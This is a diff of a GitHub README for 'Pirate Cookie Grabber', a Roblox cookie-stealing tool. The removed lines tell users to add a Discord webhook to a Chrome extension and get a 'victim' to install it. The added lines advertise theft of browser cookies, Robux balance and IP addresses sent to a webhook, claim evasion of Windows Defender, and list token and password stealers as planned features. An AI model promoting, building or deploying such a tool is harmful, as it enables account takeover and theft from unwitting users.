@@ -1,14 +1,29 @@
-# Update
-Due to the increased attention this project is getting i have decided to update it, i have fixed a few bugs in the embed and have created an entirely new embed which includes stats on the roblox account that was logged.
+# Pirate Cookie Grabber
 
-## Setup for skids
-> 1. Put your discord webhook in "scripts/log.js" "line 1"
-> 2. You may change the extension info (name, description) in "manifest.json"
-> 3. Upload the extension directory as a chrome extension and get victim to add your extension to chrome
-> 4. As soon as they add the extention you will get a message containing victim info to your webhook
-## Examples
-![alt text](examples/cookieFound.png)
+**I Am not responsible for any malicious use of this program**
 
-![alt text](examples/cookieNotFound.png)
-## Notes
-> ⭐ 
+
+Pirate Cookie grabber, The most Over-powered cookie logger in github 🤯 
+# Discord Server
+
+https://discord.gg/xBKYjyJJgN (UPDATED INV)
+
+![image](https://user-images.githubusercontent.com/60432696/190850577-26a82220-9774-42c5-beb5-479aa5ee71e1.png)
+
+# Tutorial
+https://www.youtube.com/watch?v=3AcHtJxKao4
+
+# Feautres
+	🟢Grabs Cookie from (Edge,opera,chrome,etc.)
+	🟢Sends Robux Balance to webhook
+	🟢Sends Premium Status to webhook
+	🟢Sends Roblox Username to webhook
+	🟢Sends IP Address to webhook
+	🟢Sends RAP to webhook
+	🟢Sends Creation date to webhook
+	🟢Sends Account age to webhook
+	🟣NOT DETECTED BY WINDOWS DEFENDER AND SOME OTHER ANTI VIRUSES
+# To Do
+	💎Add Token Grabber
+	💎Add EXE version Builder
+	💎Add Password Stealer
